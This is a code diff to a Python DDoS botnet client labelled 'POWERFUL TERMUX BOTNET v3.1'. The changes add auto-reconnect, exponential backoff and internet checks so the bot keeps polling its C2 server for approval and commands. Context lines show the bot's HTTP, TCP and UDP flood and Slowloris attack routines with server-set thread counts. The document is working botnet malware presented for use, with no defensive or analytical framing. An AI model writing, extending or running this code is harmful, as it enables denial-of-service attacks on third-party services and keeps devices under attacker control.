@@ -39,6 +39,8 @@ class PowerfulTermuxBot:
         self.approved = False
         self.active_attacks = []
         self.attack_lock = threading.Lock()
+        self.connection_retries = 0
+        self.max_retry_delay = 300  # Max 5 minutes between retries
         
         # Session pool for keep-alive and connection reuse
         self.session_pool = []
@@ -152,11 +154,49 @@ class PowerfulTermuxBot:
                             return round(kb / (1024**2), 1)
         except:
             return 0.0
+    
+    def check_internet_connection(self):
+        """Check if internet is available"""
+        try:
+            # Try to connect to common DNS servers
+            socket.create_connection(("8.8.8.8", 53), timeout=3)
+            return True
+        except OSError:
+            pass
+        
+        try:
+            # Try Google as fallback
+            socket.create_connection(("www.google.com", 80), timeout=3)
+            return True
+        except OSError:
+            pass
+        
+        return False
+    
+    def wait_for_internet(self):
+        """Wait until internet connection is available"""
+        print(f"\n[\033[1;31m✗\033[0m] No internet connection detected")
+        print(f"[\033[1;33m⏳\033[0m] Waiting for internet connection...")
+        
+        dots = 0
+        while not self.check_internet_connection():
+            dots = (dots + 1) % 4
+            print(f"\r[\033[1;33m...\033[0m] Checking connection" + "."*dots + " "*10, end='')
+            time.sleep(5)
+        
+        print(f"\n[\033[1;32m✓\033[0m] Internet connection restored!")
+        time.sleep(2)
+        
+    def calculate_retry_delay(self):
+        """Calculate exponential backoff delay"""
+        # Exponential backoff: 5s, 10s, 20s, 40s, 80s, up to max_retry_delay
+        delay = min(5 * (2 ** self.connection_retries), self.max_retry_delay)
+        return delay
         
     def display_banner(self):
         """Display enhanced bot information"""
         print("\n" + "╔" + "═"*58 + "╗")
-        print("║" + " "*10 + "\033[1;31mPOWERFUL TERMUX BOTNET v3.0\033[0m" + " "*17 + "║")
+        print("║" + " "*10 + "\033[1;31mPOWERFUL TERMUX BOTNET v3.1\033[0m" + " "*17 + "║")
         print("╚" + "═"*58 + "╝")
         print(f"\n[\033[1;32m+\033[0m] BOT ID: \033[1;31m{self.bot_id}\033[0m")
         print(f"[\033[1;32m+\033[0m] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
@@ -170,6 +210,7 @@ class PowerfulTermuxBot:
         print(f"    \033[1;32m✓\033[0m KEEP-ALIVE OPTIMIZATION")
         print(f"    \033[1;32m✓\033[0m ZERO-DELAY REQUESTS")
         print(f"    \033[1;32m✓\033[0m RAW SOCKET FLOODS")
+        print(f"    \033[1;32m✓\033[0m AUTO-RECONNECT ON DISCONNECT")
         
         print("\n" + "="*60)
         print("COPY YOUR BOT ID AND ADD IT IN THE SERVER DASHBOARD")
@@ -232,7 +273,10 @@ class PowerfulTermuxBot:
             )
             if response.status_code == 200:
                 result = response.json()
+                self.connection_retries = 0  # Reset retry counter on success
                 return result.get('approved', False)
+        except requests.exceptions.RequestException:
+            raise  # Re-raise to handle in caller
         except:
             pass
         return False
@@ -246,7 +290,10 @@ class PowerfulTermuxBot:
                 verify=False
             )
             if response.status_code == 200:
+                self.connection_retries = 0  # Reset retry counter on success
                 return response.json().get('commands', [])
+        except requests.exceptions.RequestException:
+            raise  # Re-raise to handle in caller
         except:
             pass
         return []
@@ -269,6 +316,7 @@ class PowerfulTermuxBot:
                 timeout=5,
                 verify=False
             )
+            self.connection_retries = 0  # Reset retry counter on success
         except:
             pass
     
@@ -313,7 +361,7 @@ class PowerfulTermuxBot:
         """MAXIMUM SPEED HTTP FLOOD - NO DELAYS"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 200)  # Default 200 threads
+        threads = cmd.get('threads', 200)  # Use threads from server
         method = cmd.get('method', 'GET').upper()
         
         print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED HTTP FLOOD\033[0m")
@@ -420,7 +468,7 @@ class PowerfulTermuxBot:
         """HIGH-SPEED TCP FLOOD"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 100)
+        threads = cmd.get('threads', 100)  # Use threads from server
         
         if ':' in target:
             host, port = target.split(':')
@@ -484,7 +532,7 @@ class PowerfulTermuxBot:
         """HIGH-SPEED UDP FLOOD"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 100)
+        threads = cmd.get('threads', 100)  # Use threads from server
         
         if ':' in target:
             host, port = target.split(':')
@@ -545,7 +593,7 @@ class PowerfulTermuxBot:
         """Slowloris attack"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        sockets_count = cmd.get('sockets', 300)
+        sockets_count = cmd.get('sockets', 300)  # Use sockets from server
         
         parsed = urlparse(target if '://' in target else 'http://' + target)
         host = parsed.hostname
@@ -658,50 +706,121 @@ class PowerfulTermuxBot:
         self.send_status('success', f'Stopped {count}')
     
     def run(self):
-        """Main loop"""
+        """Main loop with auto-reconnect"""
         self.server_url = self.get_server_url()
-        
-        print(f"\n[\033[1;36m*\033[0m] Server: {self.server_url}")
-        print(f"[\033[1;36m*\033[0m] Waiting for approval...\n")
-        
-        dots = 0
-        while not self.approved:
-            try:
-                if self.check_approval():
-                    self.approved = True
-                    print("\n\n" + "="*60)
-                    print("\033[1;32m✓ BOT APPROVED! READY FOR ATTACKS\033[0m")
-                    print("="*60 + "\n")
-                    break
-                else:
-                    dots = (dots + 1) % 4
-                    print(f"[\033[1;33m...\033[0m] Waiting (ID: \033[1;31m{self.bot_id}\033[0m)" + "."*dots + " "*10, end='\r')
-                    time.sleep(5)
-                    
-            except KeyboardInterrupt:
-                print("\n[\033[1;31m!\033[0m] Exiting...")
-                return
-            except Exception as e:
-                print(f"\n[\033[1;31m!\033[0m] Error: {e}")
-                time.sleep(10)
-        
-        print(f"[\033[1;32m+\033[0m] Active. Listening...\n")
         
         while self.running:
             try:
-                commands = self.get_commands()
-                for cmd in commands:
-                    threading.Thread(target=self.execute_command, args=(cmd,), daemon=True).start()
+                # Check internet connection first
+                if not self.check_internet_connection():
+                    self.wait_for_internet()
+                    self.connection_retries = 0  # Reset retries after internet restored
                 
-                time.sleep(5)
+                print(f"\n[\033[1;36m*\033[0m] Server: {self.server_url}")
+                print(f"[\033[1;36m*\033[0m] Waiting for approval...\n")
+                
+                # Wait for approval with reconnect logic
+                dots = 0
+                self.approved = False
+                
+                while not self.approved:
+                    try:
+                        # Check internet before attempting connection
+                        if not self.check_internet_connection():
+                            self.wait_for_internet()
+                            continue
+                        
+                        if self.check_approval():
+                            self.approved = True
+                            print("\n\n" + "="*60)
+                            print("\033[1;32m✓ BOT APPROVED! READY FOR ATTACKS\033[0m")
+                            print("="*60 + "\n")
+                            break
+                        else:
+                            dots = (dots + 1) % 4
+                            print(f"[\033[1;33m...\033[0m] Waiting (ID: \033[1;31m{self.bot_id}\033[0m)" + "."*dots + " "*10, end='\r')
+                            time.sleep(5)
+                            
+                    except requests.exceptions.RequestException as e:
+                        # Connection error - implement retry with backoff
+                        self.connection_retries += 1
+                        delay = self.calculate_retry_delay()
+                        
+                        print(f"\n[\033[1;31m✗\033[0m] Connection lost: {type(e).__name__}")
+                        print(f"[\033[1;33m⏳\033[0m] Retry {self.connection_retries} - Waiting {delay}s before reconnecting...")
+                        
+                        # Wait with countdown
+                        for remaining in range(delay, 0, -1):
+                            if not self.check_internet_connection():
+                                self.wait_for_internet()
+                                break
+                            print(f"\r[\033[1;33m...\033[0m] Reconnecting in {remaining}s" + " "*20, end='')
+                            time.sleep(1)
+                        
+                        print(f"\n[\033[1;36m↻\033[0m] Attempting to reconnect...")
+                        
+                    except KeyboardInterrupt:
+                        print("\n[\033[1;31m!\033[0m] Exiting...")
+                        return
+                    except Exception as e:
+                        print(f"\n[\033[1;31m!\033[0m] Error: {e}")
+                        time.sleep(10)
+                
+                print(f"[\033[1;32m+\033[0m] Active. Listening...\n")
+                
+                # Main command loop with reconnect
+                while self.running and self.approved:
+                    try:
+                        # Check internet periodically
+                        if not self.check_internet_connection():
+                            print(f"\n[\033[1;31m✗\033[0m] Internet connection lost during operation")
+                            self.wait_for_internet()
+                            # Break to outer loop to re-establish server connection
+                            self.approved = False
+                            break
+                        
+                        commands = self.get_commands()
+                        for cmd in commands:
+                            threading.Thread(target=self.execute_command, args=(cmd,), daemon=True).start()
+                        
+                        time.sleep(5)
+                        
+                    except requests.exceptions.RequestException as e:
+                        # Connection error during operation
+                        self.connection_retries += 1
+                        delay = self.calculate_retry_delay()
+                        
+                        print(f"\n[\033[1;31m✗\033[0m] Lost connection to C2 server: {type(e).__name__}")
+                        print(f"[\033[1;33m⏳\033[0m] Retry {self.connection_retries} - Waiting {delay}s...")
+                        
+                        # Wait with countdown
+                        for remaining in range(delay, 0, -1):
+                            if not self.check_internet_connection():
+                                self.wait_for_internet()
+                                break
+                            print(f"\r[\033[1;33m...\033[0m] Reconnecting in {remaining}s" + " "*20, end='')
+                            time.sleep(1)
+                        
+                        print(f"\n[\033[1;36m↻\033[0m] Attempting to reconnect...")
+                        
+                        # Break to outer loop to re-establish connection
+                        self.approved = False
+                        break
+                        
+                    except KeyboardInterrupt:
+                        print("\n[\033[1;31m!\033[0m] Stopping...")
+                        self.cmd_stop_all()
+                        self.running = False
+                        return
+                        
+                    except Exception as e:
+                        print(f"\n[\033[1;31m!\033[0m] Error: {e}")
+                        time.sleep(10)
                 
             except KeyboardInterrupt:
-                print("\n[\033[1;31m!\033[0m] Stopping...")
-                self.cmd_stop_all()
+                print("\n[\033[1;31m!\033[0m] Exiting...")
                 self.running = False
-            except Exception as e:
-                print(f"[\033[1;31m!\033[0m] Error: {e}")
-                time.sleep(10)
+                return
 
 
 if __name__ == '__main__':
